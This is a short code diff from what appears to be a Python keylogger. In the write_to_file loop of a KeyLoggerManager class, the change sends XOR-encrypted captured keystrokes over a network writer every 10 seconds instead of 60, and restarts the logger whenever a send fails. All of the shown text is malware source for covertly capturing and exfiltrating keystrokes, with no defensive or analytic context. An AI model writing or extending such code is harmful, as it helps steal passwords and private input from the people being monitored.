@@ -21,8 +21,10 @@ class KeyLoggerManager:
 
     def write_to_file(self):
         while self.instance.return_action():
-            Network_writer.write(self.xor_encryption())
-            time.sleep(60)
+            stop_key_looger = Network_writer.write(self.xor_encryption())
+            if not (stop_key_looger):
+                self.instance.start()
+            time.sleep(10)
 
 
     def xor_encryption(self):
